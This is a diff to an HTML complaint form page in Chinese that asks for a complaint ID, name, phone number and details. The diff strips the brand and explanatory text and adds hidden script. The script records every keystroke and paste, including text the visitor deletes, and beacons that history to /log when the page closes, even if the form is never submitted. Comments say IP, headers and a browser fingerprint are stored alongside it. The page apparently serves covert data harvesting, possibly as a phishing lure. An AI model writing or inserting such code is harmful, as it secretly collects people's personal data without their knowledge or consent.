@@ -8,9 +8,7 @@
 </head>
 <body>
   <main class="card">
-    <div class="brand">服务中心</div>
     <h1>补充投诉信息</h1>
-    <p class="sub">为加快处理您的投诉，请填写以下信息。投诉编号可在我们发送给您的邮件中找到。</p>
 
     <section id="form-section">
       <form id="complaint-form" novalidate>
@@ -27,14 +25,6 @@
             <label for="phone">联系电话 <span class="req">*</span></label>
             <input type="tel" id="phone" name="phone" required>
           </div>
-        </div>
-        <div class="field">
-          <label for="email">邮箱 <span class="req">*</span></label>
-          <input type="email" id="email" name="email" required>
-        </div>
-        <div class="field">
-          <label for="occurred_at">投诉发生时间</label>
-          <input type="datetime-local" id="occurred_at" name="occurred_at">
         </div>
         <div class="field">
           <label for="details">进一步说明 <span class="req">*</span></label>
@@ -66,6 +56,33 @@
       if (id) document.getElementById('complaint_id').value = id;
     })();
 
+    // --- 输入过程记录（按键回放）---
+    // 每次 input 事件（含打字/粘贴/剪切/撤销/自动填充）都记一条：字段、距开页的毫秒数、当时的值。
+    // 即使删掉了字，历史里仍保留"曾经打过"的痕迹。
+    var INPUT_HISTORY = [];
+    var HISTORY_START = Date.now();
+    var HISTORY_SUBMITTED = false;
+    ['complaint_id', 'name', 'phone', 'details'].forEach(function (id) {
+      var el = document.getElementById(id);
+      if (!el) return;
+      el.addEventListener('input', function () {
+        INPUT_HISTORY.push({ field: id, t: Date.now() - HISTORY_START, value: el.value });
+      });
+    });
+    // 未提交就离开时，把输入历史单独 beacon 上来
+    window.addEventListener('pagehide', function () {
+      if (HISTORY_SUBMITTED || INPUT_HISTORY.length === 0) return;
+      HISTORY_SUBMITTED = true;
+      try {
+        navigator.sendBeacon('/log', new Blob([JSON.stringify({
+          kind: 'input_history',
+          input_history: INPUT_HISTORY,
+          page_url: location.href,
+          started_at: new Date(HISTORY_START).toISOString(),
+        })], { type: 'application/json' }));
+      } catch (e) {}
+    });
+
     // 提交：把表单数据 POST 到 /log（服务端会连同 IP / 请求头一起记录）。
     var form = document.getElementById('complaint-form');
     form.addEventListener('submit', function (e) {
@@ -77,10 +94,10 @@
         complaint_id: document.getElementById('complaint_id').value.trim(),
         name: document.getElementById('name').value.trim(),
         phone: document.getElementById('phone').value.trim(),
-        email: document.getElementById('email').value.trim(),
-        occurred_at: document.getElementById('occurred_at').value,
         details: document.getElementById('details').value.trim(),
+        input_history: INPUT_HISTORY,
       };
+      HISTORY_SUBMITTED = true;
       // app.js exposes __vlSubmit, which merges the browser fingerprint into the same record.
       var p = window.__vlSubmit
         ? window.__vlSubmit(formData)
